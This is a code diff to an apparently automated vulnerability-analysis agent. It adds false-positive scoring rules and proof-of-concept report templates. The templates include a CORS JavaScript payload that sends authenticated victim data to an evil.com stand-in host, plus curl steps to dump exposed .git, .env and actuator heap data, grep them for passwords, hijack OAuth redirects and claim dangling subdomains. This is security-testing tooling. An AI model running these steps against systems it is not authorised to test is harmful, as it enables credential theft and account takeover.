@@ -195,6 +195,91 @@ class AnalyzerAgent(BaseAgent):
                 )
 
         # ---------------------------------------------------------------
+        # CORS-specific FP logic
+        # ---------------------------------------------------------------
+        is_cors = "cors" in name_lower or "cross-origin" in name_lower
+        if is_cors:
+            if "critical" in severity or "credential" in description.lower():
+                # Reflected origin with credentials → account takeover risk
+                confidence_boost += 3
+                confidence_reasons.append(
+                    "CORS: reflected/null origin with credentials:true confirmed – "
+                    "enables cross-origin account takeover"
+                )
+            elif "wildcard" in description.lower():
+                # Wildcard CORS without credentials → often intentional for public APIs
+                fp_indicators += 1
+                fp_reasons.append(
+                    "Wildcard CORS: frequently intentional for public APIs. "
+                    "Credentials cannot be sent with wildcard ACAO per spec."
+                )
+            else:
+                confidence_boost += 1
+                confidence_reasons.append(
+                    "CORS misconfiguration confirmed by scanner with content validation"
+                )
+
+        # ---------------------------------------------------------------
+        # Open redirect FP logic
+        # ---------------------------------------------------------------
+        is_redirect = "redirect" in name_lower or "open redirect" in name_lower
+        if is_redirect:
+            if inp.get("confidence") == "confirmed":
+                confidence_boost += 3
+                confidence_reasons.append(
+                    "Redirect confirmed: scanner verified final URL host matches injected domain"
+                )
+            elif inp.get("confidence") == "high":
+                confidence_boost += 2
+                confidence_reasons.append(
+                    "Redirect high confidence: partial host match in final URL"
+                )
+            chain = inp.get("chaining_potential", "none")
+            if chain in ("oauth", "ssrf"):
+                confidence_boost += 1
+                confidence_reasons.append(
+                    f"Higher impact: redirect is in an {chain.upper()} flow, "
+                    "enabling token theft or server-side request forgery"
+                )
+
+        # ---------------------------------------------------------------
+        # Subdomain takeover FP logic
+        # ---------------------------------------------------------------
+        is_takeover = "takeover" in name_lower
+        if is_takeover:
+            confidence_boost += 3
+            confidence_reasons.append(
+                "Subdomain takeover: confirmed by CNAME fingerprint AND HTTP body content match. "
+                "These are almost never false positives."
+            )
+
+        # ---------------------------------------------------------------
+        # Exposure / disclosure FP logic
+        # ---------------------------------------------------------------
+        is_exposure = any(
+            kw in name_lower
+            for kw in [
+                "exposed", "disclosure", "git", "env file", "actuator",
+                "graphql introspection", "debug", "backup", "admin panel",
+                "hardcoded secret",
+            ]
+        )
+        if is_exposure:
+            if inp.get("confidence") == "confirmed":
+                confidence_boost += 2
+                confidence_reasons.append(
+                    "Exposure confirmed by content validation (body content matched expected pattern)"
+                )
+            # Generic 200 without content validation markers is a likely FP
+            evidence = inp.get("evidence") or ""
+            if "validation" not in evidence and "confirmed" not in evidence:
+                fp_indicators += 1
+                fp_reasons.append(
+                    "Exposure finding lacks content validation evidence – "
+                    "may be a generic 200 response. Manually verify content."
+                )
+
+        # ---------------------------------------------------------------
         # Generic high-FP template patterns
         # ---------------------------------------------------------------
         info_templates = {
@@ -311,7 +396,71 @@ class AnalyzerAgent(BaseAgent):
                 "3. Replace the parameter value with an external URL: https://evil.com",
                 "4. Observe that the application redirects to the external URL without validation.",
                 "5. Craft a phishing URL combining the trusted domain with the redirect.",
-                "6. Demonstrate impact: combine with OAuth flow to steal tokens.",
+                f"   Phishing demo: curl -Lsk '{matched_at}' | grep -i redirect",
+                "6. OAuth chain demo: replace the redirect_uri in an OAuth authorization request "
+                "with the open redirect URL pointing to your server to steal the code/token.",
+            ],
+            "CORS": [
+                f"1. Send a cross-origin request to the vulnerable endpoint: {matched_at}",
+                "2. JavaScript PoC (run from evil.com origin):",
+                "   fetch('https://" + host + "/api/user', {",
+                "     credentials: 'include',",
+                "     headers: { 'Origin': 'https://evil.com' }",
+                "   }).then(r => r.json()).then(data => {",
+                "     fetch('https://evil.com/log?d=' + JSON.stringify(data));",
+                "   });",
+                "3. Confirm the Access-Control-Allow-Origin header reflects https://evil.com.",
+                "4. Confirm Access-Control-Allow-Credentials: true in response headers.",
+                "5. Host the JavaScript above on an attacker-controlled page and trick a victim into visiting.",
+                "6. Collect the exfiltrated authenticated response data from your server logs.",
+            ],
+            "SUBDOMAIN TAKEOVER": [
+                f"1. Confirm the dangling CNAME: dig CNAME {host}",
+                "2. Verify the CNAME target points to an unclaimed service (e.g. GitHub Pages, Heroku).",
+                "3. To claim the subdomain on GitHub Pages:",
+                "   a. Create a GitHub repository.",
+                "   b. Go to Settings → Pages → Custom domain.",
+                "   c. Enter the target subdomain as the custom domain.",
+                "   d. GitHub will serve content from your repository on that subdomain.",
+                "4. Once claimed, you can serve arbitrary content under the target's domain.",
+                "5. Use cases: phishing, cookie theft (if cookies are scoped to parent domain), CSP bypass.",
+                "6. Report immediately — do NOT claim the subdomain in production.",
+            ],
+            "GIT EXPOSED": [
+                f"1. Confirm the exposed repository: curl -sk {matched_at}/.git/config",
+                "2. Dump the full repository using git-dumper:",
+                f"   python3 git_dumper.py {matched_at}/.git ./output_dir",
+                "3. Alternatively: git clone {matched_at} (if directory listing enabled)",
+                "4. Examine the downloaded repository for secrets, credentials, and source code.",
+                "5. Check git log for removed secrets: git log -p | grep -i password",
+                "6. Report: source code exposure, credential leak, or internal path disclosure.",
+            ],
+            "ENV EXPOSED": [
+                f"1. Confirm the exposed file: curl -sk {matched_at}/.env",
+                "2. Review the file contents for database credentials, API keys, and secrets.",
+                "3. Attempt to use any extracted credentials to demonstrate impact.",
+                "4. Check for adjacent backup files: .env.bak, .env.production, .env.local",
+                "5. Report all extracted sensitive values (truncated for the report).",
+            ],
+            "ACTUATOR EXPOSED": [
+                f"1. Confirm the endpoint: curl -sk {matched_at}/actuator/env",
+                "2. Check for sensitive property values (database passwords, API keys):",
+                f"   curl -sk {matched_at}/actuator/env | python3 -m json.tool | grep -i pass",
+                f"3. Download heap dump (may contain in-memory secrets):",
+                f"   curl -sk {matched_at}/actuator/heapdump -o heapdump.hprof",
+                "4. Analyse heap dump: strings heapdump.hprof | grep -i password",
+                "5. Check thread dump for running queries/credentials:",
+                f"   curl -sk {matched_at}/actuator/threaddump | python3 -m json.tool",
+            ],
+            "GRAPHQL": [
+                f"1. Send an introspection query to: {matched_at}",
+                "   curl -sk -X POST -H 'Content-Type: application/json' \\",
+                f"     -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' \\",
+                f"     {matched_at}",
+                "2. Parse the returned schema to identify sensitive types and fields.",
+                "3. Enumerate all queries and mutations: look for admin, delete, update operations.",
+                "4. Test for IDOR via GraphQL IDs, missing auth on sensitive queries.",
+                "5. Use graphql-cop for automated security testing: graphql-cop -t " + matched_at,
             ],
             "LFI": [
                 f"1. Navigate to: {matched_at}",
@@ -331,12 +480,16 @@ class AnalyzerAgent(BaseAgent):
             ],
         }
 
-        # Find best match
+        # Find best match — also check description for compound names
         steps: list[str] = []
+        description_upper = description.upper()
         for key, template_steps in poc_templates.items():
             if key in vuln_type or vuln_type in key:
                 steps = template_steps
                 break
+            # Fallback: match via description keywords for compound template names
+            if not steps and key in description_upper:
+                steps = template_steps
 
         if not steps:
             steps = [
